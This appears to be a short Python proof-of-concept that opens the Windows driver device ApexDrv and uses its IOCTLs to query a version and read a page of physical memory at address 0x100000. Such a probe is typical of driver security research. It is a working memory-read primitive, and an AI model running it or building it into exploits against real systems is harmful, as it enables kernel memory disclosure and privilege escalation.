import ctypes
import struct
import sys
from ctypes import wintypes

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
k32.CreateFileW.restype = ctypes.c_void_p
k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                             ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
h = k32.CreateFileW(r"\\.\ApexDrv", 0xC0000000, 0, None, 3, 0, None)
print("handle=%#x" % (h or 0))
if not h or h == ctypes.c_void_p(-1).value:
    print("open failed err=%d" % ctypes.get_last_error())
    sys.exit(1)


def ioctl(code, buf, n):
    ret = wintypes.DWORD(0)
    ok = k32.DeviceIoControl(ctypes.c_void_p(h), wintypes.DWORD(code), buf,
                              wintypes.DWORD(n), buf, wintypes.DWORD(n),
                              ctypes.byref(ret), None)
    return ok, ctypes.get_last_error(), ret.value


b = ctypes.create_string_buffer(8)
ok, err, info = ioctl(0x8A702004, b, 8)
ver = struct.unpack_from("<I", b.raw, 0)[0] if ok else -1
print("VERSION ok=%s err=%d info=%d version=%d" % (ok, err, info, ver))

buf = ctypes.create_string_buffer(24 + 0x1000)
struct.pack_into("<QII", buf, 0, 0x100000, 16, 0)
ok, err, info = ioctl(0x8A702024, buf, 24 + 0x1000)
print("PHYS    ok=%s err=%d info=%d status=%#x copied=%d data=%s"
      % (ok, err, info, struct.unpack_from("<i", buf.raw, 16)[0],
         struct.unpack_from("<I", buf.raw, 20)[0], buf.raw[24:40].hex()))
